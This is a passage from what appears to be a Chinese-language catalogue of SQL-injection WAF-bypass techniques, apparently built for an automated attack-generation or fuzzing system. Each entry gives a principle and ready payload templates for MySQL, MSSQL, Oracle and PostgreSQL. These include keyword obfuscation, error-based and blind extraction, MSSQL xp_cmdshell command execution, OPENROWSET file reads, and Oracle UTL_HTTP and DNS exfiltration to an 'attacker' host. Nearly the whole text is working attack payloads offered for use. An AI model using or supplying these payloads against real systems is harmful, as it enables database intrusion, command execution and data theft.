- **原理**：MySQL `NO_BACKSLASH_ESCAPES` sql_mode 下反斜杠不是转义符，`\'` 等于 `\` + `'`（引号未被转义）。若应用/WAF 假设反斜杠转义行为（如按 `\\`/`\'` 处理输入），在这个 sql_mode 下逻辑失效，`\'` 直接闭合字符串。官方文档+Baeldung 实证。
- **模板**：`1' OR '1'='1` 配合后端用反斜杠转义时在 NO_BACKSLASH_ESCAPES 下直接生效（无转义）
- **来源备注**：`1' OR '1'='1` 配合后端用反斜杠转义时在 NO_BACKSLASH_ESCAPES 下直接生效（无转义）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:charset:unicode_normalize_garbage` — 非法/多字节 UTF-8 归一化生成垃圾 token 逃逸

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：打字符集归一化盲区。libinjection 对多字节/非法 UTF-8 的归一化映射存在缺陷（mod_security detectsqli 实测）：阿拉伯文等被错误解码成垃圾字符序列（如 " 1BJ) '-E/ E-E/ 9+E'F"），token 串不匹配任何已知 sqli 指纹而漏检。攻击者用多字节/超长 UTF-8 字节包夹 SQL 关键字，触发该映射失败路径，使 AST/token 分类得到"非攻击"结果。
- **模板**：`?id=%D8%B1%D9%82%D9%8A%D8%A9%20'%20OR%201=1--`（阿拉伯文包夹触发归一化错映射）
- **来源备注**：`?id=%D8%B1%D9%82%D9%8A%D8%A9%20'%20OR%201=1--`（阿拉伯文包夹触发归一化错映射）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:dialect:or_pipe_ambiguous` — || 逻辑或与字符串连接歧义绕过意图识别

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：语义引擎无法感知后端真实数据库类型，做通用语义匹配时把 `||` 判定为字符串连接（PostgreSQL/Oracle 语义）而无害放行，但 MySQL 中 `||` 是逻辑或，可承载布尔盲注。打意图识别/方言歧义盲区。
- **模板**：`1' || 1=1#`、`1' || length(user())=1#`、`1'&& 1=1#`
- **来源备注**：`1' || 1=1#`、`1' || length(user())=1#`、`1'&& 1=1#`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:intent:no_keyword_bool_blind` — 无 select/sleep 关键字的布尔盲注绕过意图识别

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：意图识别依赖语义等价，规避 union/select/sleep/benchmark 等高危关键字：用 `if` + 运算符 `/` + 冷门函数 `cot(0)`/`pow(1,1)` 做布尔/延时，`extractvalue(1,USER())` 不带 concat 做报错，语义打分判无害放行。打意图识别/无关键字语义等价盲区。
- **模板**：`1'/if(length(user())=1,cot(0),1)#`、`1'/if(length(user())=1,pow(1,1),1)#`、`1'/if(length(user())=1,extractvalue(1,USER()),1)#`
- **来源备注**：`1'/if(length(user())=1,cot(0),1)#`、`1'/if(length(user())=1,pow(1,1),1)#`、`1'/if(length(user())=1,extractvalue(1,USER()),1)#`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:lexical:after_operator_chars` — AND/OR 后无空格符号

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 词法允许 AND/OR 后直接跟 + - ~ ! @ 而无需空白（1 OR+1=1、1 AND!0），WAF 的 and\s+ 空白锚定正则失配。
- **模板**：`1 OR+1=1`、`1 AND-1=-1`、`1 OR~1`、`1 AND!0`
- **来源备注**：`1 OR+1=1`、`1 AND-1=-1`、`1 OR~1`、`1 AND!0`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.263250+00:00；updated=2026-08-23T06:54:39.975851+00:00；retired=-

### `sqli:lexical:and_or_suffix_chars` — AND/OR 后直接跟符号

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 词法允许 AND/OR 后直接跟 `+ - ~ ! @` 而无需空白（`1 AND-1=-1`、`1 OR+1=1`、`1 AND!0`），WAF 的 `and\s+` 空白锚定正则失配。
- **模板**：`id=1 AND-1=-1`、`id=1 OR+1=1`、`1 AND!0`
- **来源备注**：`id=1 AND-1=-1`、`id=1 OR+1=1`、`1 AND!0`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.980413+00:00；retired=-

### `sqli:lexical:ascii_whitespace` — ASCII 空白全集

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 词法器只认 ASCII 空白（0x09-0x0D、0x20）。`%0b`/`%0c` 对 WAF 与 MySQL 都成立；`%a0`(U+00A0) **不是** MySQL 合法空白，只能骗 WAF 正则——可靠性低于 `%0b/%0c`。
- **模板**：`1 union%0bselect 1,2`、`1%0aunion%0cselect%0d1,2%23`
- **来源备注**：`1 union%0bselect 1,2`、`1%0aunion%0cselect%0d1,2%23`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.980413+00:00；retired=-

### `sqli:lexical:backtick_ident` — 反引号标识符

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 反引号包裹标识符（`flag`、`version`），WAF 关键字匹配/表名列名指纹对反引号形态失配。
- **模板**：`select `flag` from `flags`;`、`select(`version`());`
- **来源备注**：`select `flag` from `flags`;`、`select(`version`());`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.980413+00:00；retired=-

### `sqli:lexical:case_flip` — 大小写混用

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：简单层。低价值但零成本，常与其他原语叠加；**单独使用不构成高质量样本**（学习循环会对纯 case 维度降权）。
- **模板**：`uNiOn sElEcT`、`AnD`
- **来源备注**：`uNiOn sElEcT`、`AnD`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.980413+00:00；retired=-

### `sqli:lexical:comment_split` — 关键字注释拆分

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：WAF 正则匹配连续的 `UNION SELECT`；MySQL 解析器会把 `/**/` 折叠为空白，`UN/**/ION` 语义等价于 `UNION`。WAF 看到两段，解析器看到一个关键字。
- **模板**：`UN/**/ION SELECT`、`SEL/**/ECT`、`UN/**/ION/**/SEL/**/ECT`
- **来源备注**：`UN/**/ION SELECT`、`SEL/**/ECT`、`UN/**/ION/**/SEL/**/ECT`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:comment_termination` — 注释行终止

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：# 或 --%0a 提前终止 SQL，把注入拼接余下内容当注释吞掉；MySQL 的 # 无需尾空格，-- 裸用不生效（要求尾字符）。
- **模板**：`id=1 union#a%0aselect 1,2,3#`、`id=1 xor sleep%2d%2d%0a(5)`。注意 `--` 裸用不生效（MySQL 要求尾字符），`#` 无此要求。`
- **来源备注**：`id=1 union#a%0aselect 1,2,3#`、`id=1 xor sleep%2d%2d%0a(5)`。注意 `--` 裸用不生效（MySQL 要求尾字符），`#` 无此要求。`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:dollar_quote_tag` — PostgreSQL 美元引号 $$/带标签替代单引号字符串

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PostgreSQL 的 `$$...$$` 与 `$tag$...$tag$` 完全等价于 `'...'` 字面量，且 tag 遵循标识符规则：可含非拉丁/多字节字符甚至 emoji(`$α$`/`$日$`/`$💀$`)，WAF 若只匹配引号字符或只特判空标签 `$$` 则全部落空；OWASP CRS 942100-942380 亦无针对美元引号的独立匹配规则。绕的是引号字符指纹与标签形态正则。
- **模板**：`$a$sth$a$`、`$$admin$$`、`SELECT * FROM users WHERE name=$α$admin$α$ AND 'x'='x`
- **来源备注**：`$a$sth$a$`、`$$admin$$`、`SELECT * FROM users WHERE name=$α$admin$α$ AND 'x'='x`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:dot_space` — 点周围空白/引号

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：在 schema.table 的点号周围插空白/反引号，打断 information_schema.tables 连续指纹。
- **模板**：`information_schema . tables`、``information_schema` . `tables`
- **来源备注**：`information_schema . tables`、``information_schema` . `tables`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:double_write` — 双重写

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`UNIunionON SELselectECT`——WAF 剥掉一次 `union` 后剩 `union` 逃过检测；或 WAF 匹配到子串但后端解析出完整关键字。
- **模板**：`UNIunionON SELselectECT`、`SELSELECTECT`
- **来源备注**：`UNIunionON SELselectECT`、`SELSELECTECT`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:emoji_separator` — Emoji 替代空格分隔

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 Emoji/生僻 Unicode 字符替代 SQL 词法分隔符，WAF 按 ASCII 空白/关键字匹配时失配，MySQL 词法允许部分宽字符分隔
- **模板**：`1😀UNION😀SELECT😀1,2,3`、`1ⓐANDⓐ1=1`
- **来源备注**：`1😀UNION😀SELECT😀1,2,3`、`1ⓐANDⓐ1=1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:nullbyte_truncate` — 空字节截断

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：%00 空字节让部分 WAF 视为输入结束、停止检测后续，后端解析器（如旧 PHP）则截断处理保留后面攻击
- **模板**：`1%00' UNION SELECT flag FROM flags-- -`、`SEL%00ECT`
- **来源备注**：`1%00' UNION SELECT flag FROM flags-- -`、`SEL%00ECT`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:number_boundary` — 数字字面量消除空格

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：数字字面量后直接接关键字（161444.0Union、select-1.0）消除空白，MySQL 词法把浮点/负号数字与关键字连续切分。
- **模板**：`161444.0Union(select-1.0,2,3,4,version())`、`select-1.0`、`select~1`
- **来源备注**：`161444.0Union(select-1.0,2,3,4,version())`、`select-1.0`、`select~1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:paren_whitespace` — 括号替代空白

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 允许 `UNION(SELECT(1)FROM(dual))` 用括号完全替代关键字间空白——WAF 的空白分隔正则失配。
- **模板**：`UNION(SELECT(1)FROM(dual))`、`(SELECT(username)FROM(users))`
- **来源备注**：`UNION(SELECT(1)FROM(dual))`、`(SELECT(username)FROM(users))`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:quote_split` — 引号拆分

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`UN'ION'` 在 MySQL 中 `'ION'` 是字符串字面量，`UN'ION'` 解析后等于 `UNION`（相邻字符串自动连接）；WAF 的 `UNION` 连续匹配被打断。
- **模板**：`UN'ION' SE'LECT'`、`UN'I''ON'`
- **来源备注**：`UN'ION' SE'LECT'`、`UN'I''ON'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:space_word_split` — 关键字音节间插空格

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`uni on sel ect` 在 `union select` 各音节间插空格。WAF 的 `union[\w\s]*?select` 类正则要求关键字成块；MySQL 词法跨空白合并为 `UNION SELECT`。CRS PL3 sandbox 实测返回 200（coreruleset issue #4191）。
- **模板**：`uni on sel ect 1,2,3,4,5`、`se lec t * fro m users`
- **来源备注**：`uni on sel ect 1,2,3,4,5`、`se lec t * fro m users`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:version_comment` — MySQL 版本注释

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`/*!50000SELECT*/` 是 MySQL 内联注释——WAF 当普通注释剥掉或忽略，MySQL 5.0.0+ 直接执行注释内语句。`/*!00000SEL*/` 所有版本都执行。
- **模板**：`1 /*!50000UNION*/ SELECT`、`/*!00000UNION*/ SELECT`、`and{`version`length((select/*!50000schema_name*/from/*!50000information_schema.schemata*/limit 0,1))>0}`
- **来源备注**：`1 /*!50000UNION*/ SELECT`、`/*!00000UNION*/ SELECT`、`and{`version`length((select/*!50000schema_name*/from/*!50000information_schema.schemata*/limit 0,1))>0}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:version_comment_nested` — 版本注释嵌套

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：/*/!*!/*/ 等嵌套/破坏形态的 MySQL 版本注释，WAF 当普通注释剥掉或忽略，MySQL 执行注释内语句。
- **模板**：`-1' union/*/!*!/*/select%201,2,3--+`、`/*!00000SEL*/`
- **来源备注**：`-1' union/*/!*!/*/select%201,2,3--+`、`/*!00000SEL*/`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:lexical:whitespace_sub` — 空白替换

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 把 `\t\n\v\f\r` `%a0`(0xA0) `%0b` 等视为分隔符；WAF 的单词边界正则可能只认 `%20` 和 `+`。`%a0` 是经典绕过——WAF 正则认为不是空格，MySQL 当作分隔符。
- **模板**：`1 union%a0select 1,2`、`1 union%0bselect 1,2`、`1 union/*%aa*/select 1,2`、`version()%0b`
- **来源备注**：`1 union%a0select 1,2`、`1 union%0bselect 1,2`、`1 union/*%aa*/select 1,2`、`version()%0b`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.981440+00:00；retired=-

### `sqli:mssql:char_exec_stack` — MSSQL 堆叠 EXEC + char() 拼命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MSSQL 支持堆叠查询；`;EXEC master..xp_cmdshell char(0x63)...` 用 char() 逐字节拼命令串执行，命令名不以字面量出现，绕过关键字正则；`sp_oacreate`/`xp_cmdshell` 需开启。PATT 收录该手法。
- **模板**：`';EXEC master..xp_cmdshell 'whoami' --`、`';DECLARE @s VARCHAR(8000);SET @s=CHAR(119)+CHAR(104)+CHAR(111);EXEC master..xp_cmdshell @s --`
- **来源备注**：`';EXEC master..xp_cmdshell 'whoami' --`、`';DECLARE @s VARCHAR(8000);SET @s=CHAR(119)+CHAR(104)+CHAR(111);EXEC master..xp_cmdshell @s --`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:mssql:convert_error_echo` — MSSQL CONVERT/CAST 报错回显

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MSSQL 的 `CONVERT(int, (SELECT ...))`/`CAST(... AS int)` 触发"Conversion failed"错误，错误消息回显子查询值，是 MSSQL 版报错注入（PATT 收录）。与 Oracle 类型转换报错同机制，MSSQL 函数名不同。
- **模板**：`AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))`、`AND 1=CAST((SELECT DB_NAME()) AS int)`
- **来源备注**：`AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))`、`AND 1=CAST((SELECT DB_NAME()) AS int)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:mssql:hashbytes_blind` — MSSQL HASHBYTES 盲注加速

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MSSQL `HASHBYTES('MD5', ...)` 计算哈希，可做基于哈希比较的快速盲注（每请求一次可测多字节）；WAF 词表对 HASHBYTES 覆盖弱。具体盲注编码效率依注入形态而定。
- **模板**：`AND HASHBYTES('MD5', (SELECT TOP 1 name FROM sysobjects))=HASHBYTES('MD5','x')`、`AND 1=SUBSTRING(HASHBYTES('MD5',(SELECT DB_NAME())),1,1)`
- **来源备注**：`AND HASHBYTES('MD5', (SELECT TOP 1 name FROM sysobjects))=HASHBYTES('MD5','x')`、`AND 1=SUBSTRING(HASHBYTES('MD5',(SELECT DB_NAME())),1,1)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:mssql:openrowset_read` — MSSQL OPENROWSET 读文件/外带

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`OPENROWSET(BULK 'c:\...', SINGLE_CLOB)` 可读本地文件；`OPENROWSET('SQLNCLI',...` 可连远程库；`OPENQUERY`/`OPENDATASOURCE` 做远程查询。WAF 对 OPENROWSET 形态覆盖弱，MSSQL 专用。
- **模板**：`AND 1=(SELECT CONVERT(int,(SELECT TOP 1 * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB))))`、`SELECT * FROM OPENROWSET('SQLNCLI','server=...','SELECT name FROM sysobjects')`
- **来源备注**：`AND 1=(SELECT CONVERT(int,(SELECT TOP 1 * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB))))`、`SELECT * FROM OPENROWSET('SQLNCLI','server=...','SELECT name FROM sysobjects')`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:mssql:waitfor_expr` — MSSQL WAITFOR DELAY/时间盲注

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MSSQL 的 `WAITFOR DELAY '00:00:05'` 阻塞指定时长做时间盲注（PATT 收录）；`WAITFOR` 是 Transact-SQL 关键字，WAF 词表常与 MySQL `SLEEP`/`BENCHMARK` 混淆漏配。可配合 `IF (cond) WAITFOR DELAY ...` 做条件时间盲注。
- **模板**：`'; IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '00:00:05' --`、`'; WAITFOR DELAY '00:00:05' --`
- **来源备注**：`'; IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '00:00:05' --`、`'; WAITFOR DELAY '00:00:05' --`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:oracle:alt_quote_char` — Oracle 替代引号 q'[..]' 免单引号

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Oracle 10g+ 支持替代引号语法 `q'[literal]'`（分隔符可为 `[ ]`、`{ }`、`( )`、`< >` 或任意字符），字面量内无需再用 `'`。sqlmap oraclequote tamper 专门做 `'abc' -> q'[abc]'` 替换。WAF 若只过滤/转义单引号字符则完全失配；Oracle 特有语法也不在多数 WAF 词表。
- **模板**：`q'[admin]'`、`WHERE name=q'{admin}'`、`UNION SELECT q'~1~' FROM dual`
- **来源备注**：`q'[admin]'`、`WHERE name=q'{admin}'`、`UNION SELECT q'~1~' FROM dual`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:oracle:ctxsys_drithsx` — Oracle CTXSYS.DRITHSX.SN 报错注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Oracle 文本检索组件 CTXSYS 的 `DRITHSX.SN()` 函数处理畸形参数时抛出带参数值的错误，把子查询结果带进错误信息，是 Oracle 经典报错注入向量（PATT 收录）。函数名冷门、WAF 词表基本无覆盖。
- **模板**：`AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))))`、`AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) IS NOT NULL`
- **来源备注**：`AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))))`、`AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) IS NOT NULL`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:oracle:decode_bool` — Oracle DECODE() 替代条件逻辑

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Oracle `DECODE(expr, val1, ret1, ..., default)` 用函数式条件替代 `=`/`IF`，`DECODE(1,1,1)` 恒真可作布尔原语；与 MySQL 的 `IF()`/`CASE WHEN` 同思路但 Oracle 专用、WAF 覆盖更少。
- **模板**：`AND DECODE(1,1,1)=1`、`AND DECODE((SELECT COUNT(*) FROM user_tables),0,1)=1`
- **来源备注**：`AND DECODE(1,1,1)=1`、`AND DECODE((SELECT COUNT(*) FROM user_tables),0,1)=1`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:oracle:decode_error_dual` — Oracle 报错双引号定界（q 引号 + 报错函数组合）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：组合上述 Oracle 元素：用 q'[]' 免单引号 + XMLType/UPDATEXML 类报错函数把子查询结果带进错误，双引号/定界字符可避免 URL 编码干扰。Oracle 版"语义等价变形"的整体套路。
- **模板**：`AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT COUNT(*) FROM user_tables)||CHR(62))) FROM dual)`、`AND 1=(SELECT UPDATEXML(DBMS_XMLGEN.GETXML('SELECT 1'),'//node',(SELECT user FROM dual))) IS NOT NULL`
- **来源备注**：`AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT COUNT(*) FROM user_tables)||CHR(62))) FROM dual)`、`AND 1=(SELECT UPDATEXML(DBMS_XMLGEN.GETXML('SELECT 1'),'//node',(SELECT user FROM dual))) IS NOT NULL`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:oracle:sys_context_extract` — Oracle SYS_CONTEXT('USERENV',...) 环境/盲注提取

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`SYS_CONTEXT('USERENV','CURRENT_USER')` 等返回会话/数据库上下文信息（当前用户、数据库名、主机、IP、认证方式），可替代 `SELECT user FROM dual` 做身份/环境枚举；也可放进条件做布尔盲注。Oracle 专用函数，WAF 词表不常见。
- **模板**：`AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM user_tables)>0 THEN 1 ELSE 0 END FROM dual)`、`AND SYS_CONTEXT('USERENV','CURRENT_USER')='SYS'`
- **来源备注**：`AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM user_tables)>0 THEN 1 ELSE 0 END FROM dual)`、`AND SYS_CONTEXT('USERENV','CURRENT_USER')='SYS'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:oracle:utl_http_oob` — Oracle UTL_HTTP/UTL_INADDR 外带通道

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Oracle 的 UTL_HTTP、UTL_INADDR、UTL_TCP 包可发起出站 HTTP/DNS 请求，把查询结果拼进 URL 外带（OOB）；`UTL_INADDR.GET_HOST_ADDRESS('host')` 触发 DNS 查询实现无 HTTP 出站时的数据外带。WAF 按 HTTP 请求体检测 SQL 关键字，看不到外带通道。
- **模板**：`AND UTL_HTTP.REQUEST('http://attacker/'||(SELECT user FROM dual)) IS NOT NULL`、`AND UTL_INADDR.GET_HOST_ADDRESS('attacker.'||(SELECT user FROM dual)||'.com') IS NOT NULL`
- **来源备注**：`AND UTL_HTTP.REQUEST('http://attacker/'||(SELECT user FROM dual)) IS NOT NULL`、`AND UTL_INADDR.GET_HOST_ADDRESS('attacker.'||(SELECT user FROM dual)||'.com') IS NOT NULL`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:oracle:xmltransform_comment` — Oracle DBMS_XMLTRANSLATIONS 报错回显

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
